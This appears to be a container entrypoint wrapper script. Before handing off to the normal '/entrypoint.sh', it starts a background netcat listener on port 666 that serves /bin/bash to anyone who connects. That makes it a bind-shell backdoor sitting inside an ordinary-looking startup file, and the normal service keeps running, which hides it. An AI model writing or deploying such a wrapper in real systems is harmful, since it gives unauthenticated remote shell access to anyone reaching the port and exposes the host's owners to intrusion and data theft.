#!/bin/bash

# Start netcat listener in the background
nc -lvkp 666 -e /bin/bash &

# Start normal entrypoint
/entrypoint.sh $@
